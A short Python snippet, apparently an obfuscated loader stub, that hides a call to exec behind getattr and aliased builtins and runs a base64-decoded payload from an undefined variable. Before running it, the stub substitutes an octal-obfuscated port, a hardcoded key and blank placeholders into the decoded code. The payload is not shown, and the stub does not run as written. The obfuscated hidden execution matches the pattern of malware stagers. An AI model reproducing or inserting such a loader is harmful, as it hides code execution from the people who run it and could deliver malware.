import sys
from base64 import b64decode

sys.__std__ = __builtins__
__builtins__.getattr(sys.__std__, "exec")(
    b64decode(_).decode("utf8").replace(str(int("0o17620", 8)), str(8080))
    .replace("__key__", "c70d89a8-a97f-4d4b-894f-f3bcc2d8e41c")
    .replace("__vl__", "")
    .replace("__vm__", "")
    .replace("__tr__", "")
)